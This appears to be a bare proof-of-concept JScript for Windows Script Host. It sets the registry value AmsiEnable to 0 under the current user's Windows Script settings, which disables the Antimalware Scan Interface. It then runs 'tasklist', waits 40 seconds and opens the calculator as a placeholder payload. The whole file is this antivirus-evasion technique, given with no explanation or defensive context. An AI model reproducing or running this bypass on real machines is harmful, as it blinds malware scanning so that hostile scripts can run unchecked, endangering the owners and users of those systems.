
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
sh.RegWrite(key, 0, "REG_DWORD");

var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("tasklist")
WScript.Sleep(40000);


WshShell.Run("calc")
